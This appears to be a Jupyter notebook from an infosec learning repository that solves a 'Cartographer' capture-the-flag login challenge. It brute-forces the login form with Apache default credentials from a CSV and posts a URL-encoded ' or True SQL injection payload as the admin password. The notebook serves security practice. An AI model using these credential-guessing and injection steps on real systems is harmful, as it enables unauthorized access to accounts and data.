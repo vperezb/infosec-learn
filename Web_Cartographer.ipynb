{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import csv\n",
    "\n",
    "url = 'http://88.198.233.174:36248/'\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "f= open(\"utils/cartographer_response.txt.raw\",\"r\")\n",
    "raw_response = f.read()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('utils/default-passwords.csv') as csvfile:\n",
    "    spamreader = csv.reader(csvfile, delimiter=',')\n",
    "    for row in spamreader:\n",
    "        if 'Apache' in row[0]:\n",
    "            print (row[2])\n",
    "            if not (raw_response == requests.request('POST', url, data = {'password': '{}'.format(row[2]), 'username': '{}'.format(row[1])}).text):\n",
    "                print('YEEESSSSSSSSSSSSSSSSSSSSSSSSSSS_____________________________________________')\n",
    "                break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'%27%20or%20True'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from urllib import parse\n",
    "parse.quote('\\' or True')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'\\n<html>\\n<head>\\n    <title>Cartographer - Login</title>\\n    <link rel=\\'stylesheet\\' href=\\'style.css\\' type=\\'text/css\\' />\\n</head>\\n<body>\\n    <div class=\"content-container\">\\n        <div class=\"blur\"></div>\\n    </div>\\n    <div class=\"loginform\">\\n        <center>\\n            <img src=\"logo.png\" /><br><br>\\n            <form method=\"post\">\\n                <input class=\"textbox\" type=\"text\" name=\"username\" placeholder=\"Username\"><br><br>\\n                <input class=\"textbox\" type=\"password\" name=\"password\" placeholder=\"Password\"><br><br>\\n                <input class=\"loginbutton\" type=\"submit\" value=\"Login\">\\n            </form>\\n        </center>\\n    </div>\\n</body>\\n</html>\\n'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "payload = {\n",
    "    'username':'admin', \n",
    "    'password': parse.quote('\\' or True')}\n",
    "\n",
    "\n",
    "requests.request('POST', url, data = payload).text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!pip3 uninstall parse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from urllib.parse import urlencode, quote_plus\n",
    "\n",
    "payload = {'username':'administrator', 'password':'xyz'}\n",
    "result = urlencode(payload, quote_via=quote_plus)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
